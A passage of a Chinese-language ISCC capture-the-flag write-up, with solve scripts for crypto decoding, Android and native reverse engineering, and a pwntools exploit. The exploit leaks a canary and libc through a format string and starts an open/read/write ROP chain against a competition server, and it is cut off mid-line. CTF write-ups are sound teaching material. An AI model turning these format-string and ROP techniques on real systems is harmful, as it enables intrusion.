class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">ci = <span class="string">&#x27;01000011001100010100010000110010001101000011011001000101001100000011010100110011010001100011001101000101001101010011011100110010&#x27;</span></span><br><span class="line">c0 = <span class="string">&#x27;I7C6UH1EXT9P4E38&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_decrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">    decrypted = []</span><br><span class="line">    key_shifts = [<span class="built_in">ord</span>(k.upper()) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">for</span> k <span class="keyword">in</span> key]</span><br><span class="line">    key_len, key_idx = <span class="built_in">len</span>(key_shifts), <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            shift = key_shifts[key_idx % key_len]</span><br><span class="line">            upper_char = char.upper()</span><br><span class="line">            decrypted_code = (<span class="built_in">ord</span>(upper_char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>(decrypted_code)</span><br><span class="line">            decrypted.append(decrypted_char.lower() <span class="keyword">if</span> char.islower() <span class="keyword">else</span> decrypted_char)</span><br><span class="line">            key_idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decrypted.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>(<span class="params">cs</span>):</span><br><span class="line">    <span class="keyword">return</span> vigenere_decrypt(cs, <span class="string">&#x27;ExpectoPatronum&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c2 = a(c0)</span><br><span class="line">c1 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(ci[i:i+<span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ci), <span class="number">8</span>))</span><br><span class="line"><span class="comment"># 修改处：使用min(len(c1), len(c2))作为循环次数</span></span><br><span class="line">min_len = <span class="built_in">min</span>(<span class="built_in">len</span>(c1), <span class="built_in">len</span>(c2))</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span>.join(c1[i] + c2[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_len))</span><br><span class="line"></span><br><span class="line">byte_array = [<span class="built_in">int</span>(c[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c), <span class="number">2</span>)]</span><br><span class="line">c3 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;b:08b&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> byte_array)</span><br><span class="line">str1 = c3.translate(<span class="built_in">str</span>.maketrans(<span class="string">&#x27;01&#x27;</span>, <span class="string">&#x27;10&#x27;</span>))</span><br><span class="line">c4 = <span class="built_in">bytes</span>(<span class="built_in">int</span>(str1[i:i+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(str1), <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_ksa</span>(<span class="params">key</span>):</span><br><span class="line">    key = key.encode() <span class="keyword">if</span> <span class="built_in">isinstance</span>(key, <span class="built_in">str</span>) <span class="keyword">else</span> key</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_prga</span>(<span class="params">S, data</span>):</span><br><span class="line">    data = data <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>) <span class="keyword">else</span> data.encode()</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        result.append(byte ^ S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line">S = rc4_ksa(<span class="string">&#x27;ExpectoPatronum&#x27;</span>)</span><br><span class="line">res = rc4_prga(S, c4)</span><br><span class="line">flag = <span class="string">f&quot;ISCC&#123;&#123;<span class="subst">&#123;res.decode()&#125;</span>&#125;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#ISCC&#123;H0gw@rts~ExpR3ss&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>mobile-</p>
+<p>ida打开libmobile04.so在Java_com_example_mobile04_MainActivity_getEncryptedSegment函数里，<img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/mobile2-1.png" alt="mobile2-1"></p>
+<p>点进aDex035，是一个dex，所以提取出来用jadx打开，</p>
+<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/mobile2-2.png" alt="mobile2-2"></p>
+<p>从关键字上可以看出是des加密。</p>
+<p>打开libSunday.so，进入Java_com_example_mobile04_Sunday_getKey函数，发现字符串：</p>
+<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/mobile2-7.png" alt="mobile2-7"></p>
+<p>去cyberchef解密</p>
+<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/mobile2-5.png" alt="mobile2-5"></p>
+<p>之后ida打开libMonday.so，在Java_com_example_mobile04_a_checkFlag2函数中可以看到对enreal的加密<img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/mobile2-3.png" alt="mobile2-3"></p>
+<p>扔给ai，获得一个解密脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：这里假设输入/输出文件名是硬编码的 &quot;enreal&quot; 和 &quot;decode_enreal&quot;，</span></span><br><span class="line"><span class="comment"># 如果需要从命令行读取，请保留上一个回答中的 sys.argv 部分。</span></span><br><span class="line"><span class="comment"># 但是根据您提供的修改脚本的形式，似乎是直接执行这段代码，</span></span><br><span class="line"><span class="comment"># 所以这里保留硬编码的文件名。</span></span><br><span class="line"></span><br><span class="line">input_filename = <span class="string">&quot;enreal&quot;</span></span><br><span class="line">output_filename = <span class="string">&quot;decode_enreal&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = <span class="built_in">list</span>(f.read())</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;错误：找不到输入文件 &#x27;<span class="subst">&#123;input_filename&#125;</span>&#x27;。&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;读取文件 &#x27;<span class="subst">&#123;input_filename&#125;</span>&#x27; 时发生错误：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    byte_val = data[i] <span class="comment"># 获取当前字节值 (0-255)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实现 C 表达式的逻辑:</span></span><br><span class="line">    <span class="comment"># *(_BYTE *)(v9 + i) = ((char)~(((unsigned __int16)*(char *)(v9 + i) &gt;&gt; 6) | (4 * *(_BYTE *)(v9 + i))) &gt;&gt; 3) | (32 * ~(((unsigned __int16)*(char *)(v9 + i) &gt;&gt; 6) | (4 * *(_BYTE *)(v9 + i))));</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 计算子表达式 A = ((unsigned __int16)byte_val &gt;&gt; 6) | (4 * byte_val)</span></span><br><span class="line">    <span class="comment">#    这等同于 byte_val 左循环移位 2 位: (byte_val &lt;&lt; 2) | (byte_val &gt;&gt; 6)</span></span><br><span class="line">    <span class="comment">#    结果需要保持在 8 位范围内 (0-255)</span></span><br><span class="line">    rotated_val_L2 = ((byte_val &lt;&lt; <span class="number">2</span>) | (byte_val &gt;&gt; <span class="number">6</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 对 A 进行 8 位按位非: ~rotated_val_L2</span></span><br><span class="line">    <span class="comment">#    在 Python 中 8 位按位非是 val ^ 0xFF</span></span><br><span class="line">    not_rotated_val = rotated_val_L2 ^ <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 对结果进行右循环移位 3 位: ((char)not_rotated_val &gt;&gt; 3) | (32 * not_rotated_val)</span></span><br><span class="line">    <span class="comment">#    这等同于 (not_rotated_val &gt;&gt; 3) | (not_rotated_val &lt;&lt; 5)</span></span><br><span class="line">    <span class="comment">#    结果需要保持在 8 位范围内 (0-255)</span></span><br><span class="line">    final_val = ((not_rotated_val &gt;&gt; <span class="number">3</span>) | (not_rotated_val &lt;&lt; <span class="number">5</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将计算出的最终值赋回列表</span></span><br><span class="line">    data[i] = final_val</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">bytes</span>(data))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;写入文件 &#x27;<span class="subst">&#123;output_filename&#125;</span>&#x27; 时发生错误：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;成功处理文件 &#x27;<span class="subst">&#123;input_filename&#125;</span>&#x27; 并将结果保存到 &#x27;<span class="subst">&#123;output_filename&#125;</span>&#x27;。&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>解密出decode_enreal,用ida打开，可以看见real_check函数，第十五行是密钥，22行是密文<img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/mobile2-4.png"></p>
+<p>去cyberchef解密<img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/mobile2-6.png" alt="mobile2-6"></p>
+<p>两段拼接之后包裹上ISCC{}就可以了</p>
+<h3 id="reverse1-CrackMe"><a href="#reverse1-CrackMe" class="headerlink" title="reverse1-CrackMe"></a>reverse1-CrackMe</h3><p>ida反编译，在main函数按f5看伪代码，进每个函数里瞅瞅</p>
+<p>发现是标准rc4，所以直接找个脚本填入数据，数据如图</p>
+<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/re1-1.png" alt="re1-1"></p>
+<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/re1-2.png" alt="re1-2"></p>
+<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/re1-3.png" alt="re1-3"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* key, <span class="type">int</span> key_Len,<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">int</span> data_Len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span>  <span class="type">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (j + s[i] + key[i % key_Len]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> q = <span class="number">0</span>;</span><br><span class="line">    i = j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (q = <span class="number">0</span>; q &lt; data_Len; q++) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">        data[q] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">42</span>] = &#123;<span class="number">0x1C</span>,<span class="number">0xB8</span>,<span class="number">0x2E</span>,<span class="number">0x47</span>,<span class="number">0xDD</span>,<span class="number">0x72</span>,<span class="number">0x1C</span>,<span class="number">0xA2</span>,<span class="number">0xDE</span>,<span class="number">0x13</span>,<span class="number">0x32</span>,<span class="number">0x46</span>,<span class="number">0xC8</span>,<span class="number">0xF0</span>,<span class="number">0x59</span>,<span class="number">0x81</span>,<span class="number">0xB0</span>,<span class="number">0xE6</span>,<span class="number">0xE4</span>,<span class="number">0xEE</span>,<span class="number">0x03</span>,<span class="number">0x9A</span>,<span class="number">0x58</span>,<span class="number">0x28</span>,<span class="number">0x4E</span>,<span class="number">0x6B</span>,<span class="number">0x9F</span>,<span class="number">0xE8</span>,<span class="number">0x80</span>,<span class="number">0x24</span>,<span class="number">0x82</span>,<span class="number">0x3F</span>,<span class="number">0xD6</span>,<span class="number">0x15</span>,<span class="number">0x68</span>,<span class="number">0x17</span>,<span class="number">0xEE</span>,<span class="number">0x91</span>,<span class="number">0xD7</span>,<span class="number">0xFE</span>,<span class="number">0x35</span>,<span class="number">0x74</span>,&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* key = <span class="string">&quot;SecretKey&quot;</span>;</span><br><span class="line">    rc4(key, <span class="built_in">strlen</span>(key), flag, <span class="number">42</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (flag[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; flag[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            flag[i] = (flag[i] - <span class="string">&#x27;a&#x27;</span> + <span class="number">26</span> - <span class="number">3</span>) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (flag[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; flag[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            flag[i] = (flag[i] - <span class="string">&#x27;A&#x27;</span> + <span class="number">26</span> - <span class="number">3</span>) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i] ^ <span class="number">65</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ISCC&#123;N#ZGDg7q[j1Odaf&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="reverse2-uglyCpp"><a href="#reverse2-uglyCpp" class="headerlink" title="reverse2-uglyCpp"></a>reverse2-uglyCpp</h2><p>ida反编译，在main函数按f5反编译，</p>
+<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/re2-1.png" alt="re2-1"></p>
+<p>进入此函数，发现<img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/re2-2.png" alt="re2-2"></p>
+<p>对这些数字按h，转换成16进制</p>
+<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/re2-3.png" alt="re2-3"></p>
+<p>所以写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">0x3ED6325B</span>,<span class="number">0xD709BF17</span>,<span class="number">0xE3F27E18</span>,<span class="number">0xA0870791</span>,<span class="number">0x146D6F9</span>,<span class="number">0x7C6140FF</span>,<span class="number">0x10B69406</span>,<span class="number">0x94DDE0F6</span>,<span class="number">0x40B2BB6C</span>]</span><br><span class="line">res = [<span class="number">0x53854801</span>,<span class="number">0x943EDE20</span>,<span class="number">0x0A09A1865</span>,<span class="number">0x0F0B26BC2</span>, <span class="number">0x463CB282</span>, <span class="number">0x320939B6</span>, <span class="number">0x41DBF048</span>, <span class="number">0x0A39CB5B5</span>, <span class="number">0x26DFDC3C</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    flag.append(<span class="built_in">hex</span>(key[i]^res[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((flag))</span><br><span class="line">hex_strings = flag</span><br><span class="line">decoded_flag = <span class="string">&quot;&quot;</span></span><br><span class="line">tmp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> hex_string <span class="keyword">in</span> hex_strings:</span><br><span class="line">    hex_string = hex_string[<span class="number">2</span>:]</span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_string), <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">1</span> &lt; <span class="built_in">len</span>(hex_string):</span><br><span class="line">            byte = <span class="built_in">int</span>(hex_string[i:i+<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">            tmp += <span class="built_in">chr</span>(byte)</span><br><span class="line">    decoded_flag += tmp[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">flag = decoded_flag</span><br><span class="line">word1 = <span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">word2 = <span class="string">&quot;vfw8xgy4zh9i2j0k5lam1nbo6pcq3rds7teu&quot;</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(word1)):</span><br><span class="line">    tmp = word2.index(word1[i])</span><br><span class="line">    res +=flag[tmp]</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[&#x27;0x6d537a5a&#x27;, &#x27;0x43376137&#x27;, &#x27;0x4368667d&#x27;, &#x27;0x50356c53&#x27;, &#x27;0x477a647b&#x27;, &#x27;0x4e687949&#x27;, &#x27;0x516d644e&#x27;, &#x27;0x37415543&#x27;, &#x27;0x666d6750&#x27;]</span></span><br><span class="line"><span class="comment">#ISCC&#123;NPmh5zhmAmzafClPdGyNdQU7gfZS77&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn1-Dilemma"><a href="#pwn1-Dilemma" class="headerlink" title="pwn1-Dilemma"></a>pwn1-Dilemma</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Remote connection</span></span><br><span class="line">p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">12500</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./attachment-42&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Gadgets and addresses</span></span><br><span class="line">pop_rdi = <span class="number">0x40119a</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x40119c</span></span><br><span class="line">bss = <span class="number">0x404000</span> + <span class="number">0x900</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;where are you go?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Enter you password:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;%39$p%11$p&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_start = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">128</span></span><br><span class="line">libc_base = libc_start - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;I will check your password:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;a&quot;</span> * <span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;where are you go?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;We have a lot to talk about\n&quot;</span>)</span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(bss + <span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0x4011c9</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">open_plt  = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_plt  = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x11f2e7</span>  </span><br><span class="line">rop  = <span 